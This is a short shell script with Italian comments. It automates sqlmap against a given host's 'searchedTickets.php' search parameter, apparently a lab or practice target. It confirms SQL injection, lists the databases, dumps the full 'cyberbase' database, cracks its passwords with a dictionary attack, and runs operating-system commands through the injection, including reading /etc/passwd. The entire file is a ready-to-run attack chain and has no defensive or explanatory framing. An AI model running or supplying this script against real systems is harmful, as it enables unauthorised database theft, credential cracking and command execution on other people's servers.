#!/bin/sh

HOST="$1"
if [ -z "$HOST" ]; then
    echo "Uso: $0 <HOST>"
    echo "Specificare l'host senza http:// e senza path - solo l'indirizzo o IP"
    exit 1
fi

# Uso Sqlmap per verificare la SQL Injection
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch
sleep 1

# Guardo i database disponibili
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --dbs
sleep 1

# Guardo lo schema del database "cyberbase"
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch -D cyberbase --schema
sleep 1

# Dumpo tutti i contenuti del DB cyberbase. Vengono anche craccate le password con un attacco dizionario
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch -D cyberbase --dump-all
sleep 1

# Ottengo una shell sul sistema operativo
#sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-shell

# Dò alcuni comandi sul sistema operativo
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "whoami"
sleep 1
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "id"
sleep 1
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "uname -a"
sleep 1
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "ls"
sleep 1
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "cat /etc/passwd"
sleep 1
